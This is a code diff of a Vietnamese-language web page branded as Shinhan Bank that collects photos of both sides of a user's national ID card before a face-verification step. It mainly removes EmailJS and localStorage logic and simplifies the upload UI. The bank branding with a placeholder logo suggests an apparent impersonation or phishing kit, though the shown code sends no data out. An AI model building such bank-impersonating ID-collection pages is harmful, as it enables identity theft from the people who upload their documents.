@@ -3,11 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shinhan Bank - Xác Thực Giấy Tờ</title>
+    <title>Shinhan Bank - Chụp CMND/CCCD</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         :root {
             --primary-color: #003087;
@@ -17,16 +15,29 @@
         body {
             font-family: 'Roboto', sans-serif;
             background-color: var(--secondary-color);
+            overflow-x: hidden;
         }
         .navbar {
             background-color: var(--primary-color);
         }
         .navbar-brand img {
             height: 50px;
+            max-width: 100%;
+            object-fit: contain;
+        }
+        .navbar-nav {
+            display: flex;
+            flex-wrap: nowrap;
+            overflow-x: auto;
+            white-space: nowrap;
+            -webkit-overflow-scrolling: touch;
         }
         .navbar-nav .nav-link {
             color: white !important;
             transition: color 0.3s;
+            padding: 8px 10px;
+            font-size: 0.9rem;
+            margin: 0 5px;
         }
         .navbar-nav .nav-link:hover {
             color: var(--accent-color) !important;
@@ -80,20 +91,24 @@
             padding: 15px;
             border-radius: 8px;
             box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
-            margin: 15px 0;
+            margin-bottom: 15px;
+            text-align: center;
         }
-        .upload-section h3 {
+        .upload-section h2 {
             color: var(--primary-color);
             border-bottom: 2px solid var(--accent-color);
             padding-bottom: 8px;
             margin-bottom: 15px;
             font-size: 1.2rem;
         }
-        .upload-section img {
+        .upload-box {
+            border: 2px dashed #ccc;
+            padding: 20px;
+            margin: 10px;
+        }
+        .upload-box img {
             max-width: 100%;
             height: auto;
-            margin-top: 10px;
-            border-radius: 5px;
         }
         .btn-primary {
             background-color: var(--primary-color);
@@ -106,6 +121,12 @@
             background-color: var(--accent-color);
             border-color: var(--accent-color);
         }
+        .error-message {
+            color: #dc3545;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            display: none;
+        }
         .footer-links a {
             margin: 0 8px;
             color: var(--primary-color);
@@ -115,32 +136,21 @@
         .footer-links a:hover {
             color: var(--accent-color);
         }
-        .error {
-            color: #dc3545;
-            font-size: 0.8rem;
-            margin-top: 3px;
-        }
-        .success-message {
-            color: #28a745;
-            font-size: 0.8rem;
-            margin-top: 5px;
-            display: none;
-        }
-        .spinner {
-            display: none;
-            margin-left: 8px;
-        }
-        .block-message {
-            background: #fff3cd;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin: 20px 0;
-            color: #856404;
-        }
         @media (max-width: 768px) {
             .navbar-brand img {
                 height: 40px;
+                max-width: 100%;
+                object-fit: contain;
+            }
+            .navbar-nav {
+                flex-wrap: nowrap;
+                overflow-x: auto;
+                padding-bottom: 10px;
+            }
+            .navbar-nav .nav-link {
+                font-size: 0.8rem;
+                padding: 6px 8px;
+                margin: 0 3px;
             }
             .step-indicator {
                 display: none;
@@ -149,17 +159,16 @@
                 font-size: 0.9rem;
             }
             .upload-section {
-                padding: 10px;
+                padding: 15px;
             }
-            .upload-section h3 {
-                font-size: 1rem;
+            .container {
+                padding-left: 12px;
+                padding-right: 12px;
             }
-            .btn-primary, .btn-secondary {
+            .btn-primary, .btn-outline-secondary {
                 width: 100%;
-                margin-bottom: 10px;
-            }
-            .upload-section img {
-                max-width: 80%;
+                margin-bottom: 12px;
+                font-size: 0.85rem;
             }
         }
     </style>
@@ -168,7 +177,7 @@
     <header>
         <nav class="navbar navbar-expand-lg">
             <div class="container">
-                <a class="navbar-brand" href="#"><img src="https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo" alt="Shinhan Bank Logo"></a>
+                <a class="navbar-brand" href="#"><img src="/assets/shinhan-logo.png" onerror="this.src='https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo'" alt="Shinhan Bank Logo"></a>
                 <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                     <span class="navbar-toggler-icon"></span>
                 </button>
@@ -196,67 +205,44 @@
             <div class="step">3. Hoàn thành</div>
         </div>
 
-        <div id="blockMessage" class="block-message" style="display: none;">
-            <p><strong>Thông báo:</strong> Đã có hồ sơ đăng ký tại Ngân hàng Shinhan. Vui lòng liên hệ hỗ trợ để biết thêm chi tiết.</p>
-        </div>
+        <div class="upload-section">
+            <h2>CHỤP HOẶC QUÉT CMND/CCCD/HỘ CHIẾU</h2>
 
-        <div id="uploadContent">
-            <h2 class="text-center mb-3">CHỤP HOẶC QUÉT CMND/CCCD/HỘ CHIẾU</h2>
-
-            <div class="accordion" id="uploadAccordion">
-                <div class="accordion-item">
-                    <h2 class="accordion-header">
-                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#frontImageSection" aria-expanded="true" aria-controls="frontImageSection">
-                            Hình Ảnh Mặt Trước
-                        </button>
-                    </h2>
-                    <div id="frontImageSection" class="accordion-collapse collapse show" data-bs-parent="#uploadAccordion">
-                        <div class="accordion-body">
-                            <p>Vui lòng chụp ảnh rõ nét, không che góc, đảm bảo toàn bộ CCCD nằm trong khung.</p>
-                            <input type="file" id="frontImage" accept="image/jpeg,image/png" aria-label="Tải ảnh mặt trước CCCD" required>
-                            <div id="frontImagePreview" class="mt-2"></div>
-                            <p id="frontImageError" class="error"></p>
-                            <p id="frontImageSuccess" class="success-message">Ảnh mặt trước đã được tải lên!</p>
-                            <div class="mt-2">
-                                <button class="btn btn-primary" onclick="captureImage('front')">Chụp ảnh</button>
-                                <button class="btn btn-secondary" onclick="clearImage('front')">Xóa Ảnh</button>
-                                <button class="btn btn-secondary" onclick="captureImage('front')">Chụp Lại</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="accordion-item">
-                    <h2 class="accordion-header">
-                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#backImageSection" aria-expanded="true" aria-controls="backImageSection">
-                            Hình Ảnh Mặt Sau
-                        </button>
-                    </h2>
-                    <div id="backImageSection" class="accordion-collapse collapse show" data-bs-parent="#uploadAccordion">
-                        <div class="accordion-body">
-                            <p>Vui lòng chụp ảnh rõ nét, không che góc, đảm bảo toàn bộ CCCD nằm trong khung.</p>
-                            <input type="file" id="backImage" accept="image/jpeg,image/png" aria-label="Tải ảnh mặt sau CCCD" required>
-                            <div id="backImagePreview" class="mt-2"></div>
-                            <p id="backImageError" class="error"></p>
-                            <p id="backImageSuccess" class="success-message">Ảnh mặt sau đã được tải lên!</p>
-                            <div class="mt-2">
-                                <button class="btn btn-primary" onclick="captureImage('back')">Chụp ảnh</button>
-                                <button class="btn btn-secondary" onclick="clearImage('back')">Xóa Ảnh</button>
-                                <button class="btn btn-secondary" onclick="captureImage('back')">Chụp Lại</button>
-                            </div>
-                        </div>
-                    </div>
+            <div class="upload-box">
+                <h3>Hình Ảnh Mặt Trước</h3>
+                <p>Vui lòng chụp ảnh rõ nét, không che góc, đảm bảo toàn bộ CCCD nằm trong khung.</p>
+                <input type="file" accept="image/*" id="frontImage" style="display: none;">
+                <img id="frontPreview" src="" alt="" style="display: none;">
+                <p id="frontStatus" style="display: none;">Ảnh mặt trước đã được tải lên!</p>
+                <div class="d-flex justify-content-center gap-2">
+                    <button class="btn btn-primary" onclick="document.getElementById('frontImage').click()">Chụp ảnh</button>
+                    <button class="btn btn-outline-danger" onclick="clearImage('front')">Xóa Ảnh</button>
+                    <button class="btn btn-outline-primary" onclick="document.getElementById('frontImage').click()">Chụp Lại</button>
                 </div>
             </div>
+
+            <div class="upload-box">
+                <h3>Hình Ảnh Mặt Sau</h3>
+                <p>Vui lòng chụp ảnh rõ nét, không che góc, đảm bảo toàn bộ CCCD nằm trong khung.</p>
+                <input type="file" accept="image/*" id="backImage" style="display: none;">
+                <img id="backPreview" src="" alt="" style="display: none;">
+                <p id="backStatus" style="display: none;">Ảnh mặt sau đã được tải lên!</p>
+                <div class="d-flex justify-content-center gap-2">
+                    <button class="btn btn-primary" onclick="document.getElementById('backImage').click()">Chụp ảnh</button>
+                    <button class="btn btn-outline-danger" onclick="clearImage('back')">Xóa Ảnh</button>
+                    <button class="btn btn-outline-primary" onclick="document.getElementById('backImage').click()">Chụp Lại</button>
+                </div>
+            </div>
+
+            <p id="uploadError" class="error-message">Vui lòng chụp hoặc tải ảnh mặt trước và mặt sau đầy đủ.</p>
 
             <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
                 <div class="mb-2 mb-md-0">
                     <a href="step1.html" class="btn btn-outline-secondary">QUAY LẠI</a>
-                    <button type="button" class="btn btn-outline-danger ms-2" onclick="resetProgress()">XÓA TIẾN TRÌNH</button>
                 </div>
-                <button class="btn btn-primary position-relative" onclick="nextStep()">
-                    BƯỚC KẾ TIẾP
-                    <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
-                </button>
+                <div>
+                    <button class="btn btn-primary" onclick="proceedToStep3()">TIẾP TỤC</button>
+                </div>
             </div>
         </div>
     </main>
@@ -279,139 +265,50 @@
         </div>
     </footer>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Initialize EmailJS
-        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
-
-        // Check for existing registration
-        window.onload = function() {
-            if (localStorage.getItem('registered')) {
-                document.getElementById('blockMessage').style.display = 'block';
-                document.getElementById('uploadContent').style.display = 'none';
-                return;
-            }
-
-            // Load saved images
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
-            if (savedData.step2) {
-                if (savedData.step2.frontImage) {
-                    document.getElementById('frontImagePreview').innerHTML = `<img src="${savedData.step2.frontImage}" alt="Ảnh mặt trước CCCD" style="max-width: 300px;">`;
-                    document.getElementById('frontImageSuccess').style.display = 'block';
-                }
-                if (savedData.step2.backImage) {
-                    document.getElementById('backImagePreview').innerHTML = `<img src="${savedData.step2.backImage}" alt="Ảnh mặt sau CCCD" style="max-width: 300px;">`;
-                    document.getElementById('backImageSuccess').style.display = 'block';
-                }
-            }
-        };
-
-        function captureImage(type) {
-            const input = document.getElementById(type + 'Image');
-            input.click();
-            input.onchange = function (event) {
-                const file = event.target.files[0];
-                const errorElement = document.getElementById(type + 'ImageError');
-                const successElement = document.getElementById(type + 'ImageSuccess');
-                const previewElement = document.getElementById(type + 'ImagePreview');
-
-                if (!file) {
-                    errorElement.textContent = 'Vui lòng chọn một file hình ảnh.';
-                    successElement.style.display = 'none';
-                    return;
-                }
-
-                if (!['image/jpeg', 'image/png'].includes(file.type)) {
-                    errorElement.textContent = 'Chỉ chấp nhận file JPG hoặc PNG.';
-                    successElement.style.display = 'none';
-                    return;
-                }
-
-                if (file.size > 5 * 1024 * 1024) {
-                    errorElement.textContent = 'File phải nhỏ hơn 5MB.';
-                    successElement.style.display = 'none';
-                    return;
-                }
-
-                errorElement.textContent = '';
-                successElement.style.display = 'block';
+        document.getElementById('frontImage').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
                 const reader = new FileReader();
-                reader.onload = function (e) {
-                    previewElement.innerHTML = `<img src="${e.target.result}" alt="Ảnh ${type === 'front' ? 'mặt trước' : 'mặt sau'} CCCD" style="max-width: 300px;">`;
-                    saveImage(type, e.target.result);
+                reader.onload = function(e) {
+                    document.getElementById('frontPreview').src = e.target.result;
+                    document.getElementById('frontPreview').style.display = 'block';
+                    document.getElementById('frontStatus').style.display = 'block';
+                    document.getElementById('uploadError').style.display = 'none';
                 };
                 reader.readAsDataURL(file);
-            };
-        }
+            }
+        });
 
-        function saveImage(type, dataUrl) {
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
-            savedData.step2 = savedData.step2 || {};
-            savedData.step2[type + 'Image'] = dataUrl;
-            savedData.currentStep = 2;
-            localStorage.setItem('registrationData', JSON.stringify(savedData));
-        }
+        document.getElementById('backImage').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById('backPreview').src = e.target.result;
+                    document.getElementById('backPreview').style.display = 'block';
+                    document.getElementById('backStatus').style.display = 'block';
+                    document.getElementById('uploadError').style.display = 'none';
+                };
+                reader.readAsDataURL(file);
+            }
+        });
 
         function clearImage(type) {
-            const input = document.getElementById(type + 'Image');
-            const previewElement = document.getElementById(type + 'ImagePreview');
-            const errorElement = document.getElementById(type + 'ImageError');
-            const successElement = document.getElementById(type + 'ImageSuccess');
-            input.value = '';
-            previewElement.innerHTML = '';
-            errorElement.textContent = '';
-            successElement.style.display = 'none';
-
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
-            if (savedData.step2) {
-                delete savedData.step2[type + 'Image'];
-                localStorage.setItem('registrationData', JSON.stringify(savedData));
-            }
+            document.getElementById(type + 'Image').value = '';
+            document.getElementById(type + 'Preview').style.display = 'none';
+            document.getElementById(type + 'Status').style.display = 'none';
         }
 
-        function nextStep() {
-            const frontImage = document.getElementById('frontImage').files[0] || (document.getElementById('frontImagePreview').querySelector('img') && document.getElementById('frontImagePreview').querySelector('img').src);
-            const backImage = document.getElementById('backImage').files[0] || (document.getElementById('backImagePreview').querySelector('img') && document.getElementById('backImagePreview').querySelector('img').src);
-            const frontErrorElement = document.getElementById('frontImageError');
-            const backErrorElement = document.getElementById('backImageError');
-            const spinner = document.querySelector('.spinner');
-
-            if (!frontImage) {
-                frontErrorElement.textContent = 'Vui lòng tải lên ảnh mặt trước của CCCD.';
-                return;
-            }
-            if (!backImage) {
-                backErrorElement.textContent = 'Vui lòng tải lên ảnh mặt sau của CCCD.';
-                return;
-            }
-
-            spinner.style.display = 'inline-block';
-
-            // Send confirmation email
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
-            const emailParams = {
-                to_email: savedData.step1?.email || 'user@example.com',
-                full_name: savedData.step1?.fullName || 'Khách hàng',
-                message: 'Ảnh CCCD của bạn đã được tải lên thành công. Vui lòng tiếp tục bước xác minh khuôn mặt.'
-            };
-
-            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailParams)
-                .then(() => {
-                    console.log('Upload confirmation email sent');
-                    spinner.style.display = 'none';
-                    window.location.href = 'step3.html';
-                }, (error) => {
-                    console.error('Email sending failed:', error);
-                    alert('Lỗi khi gửi email xác nhận. Vui lòng thử lại.');
-                    spinner.style.display = 'none';
-                });
-        }
-
-        function resetProgress() {
-            if (confirm('Bạn có chắc chắn muốn xóa toàn bộ tiến trình?')) {
-                localStorage.removeItem('registrationData');
-                localStorage.removeItem('registered');
-                window.location.href = 'step1.html';
+        function proceedToStep3() {
+            const frontImage = document.getElementById('frontImage').files.length > 0;
+            const backImage = document.getElementById('backImage').files.length > 0;
+            if (frontImage && backImage) {
+                window.location.href = 'step3.html';
+            } else {
+                document.getElementById('uploadError').style.display = 'block';
             }
         }
     </script>
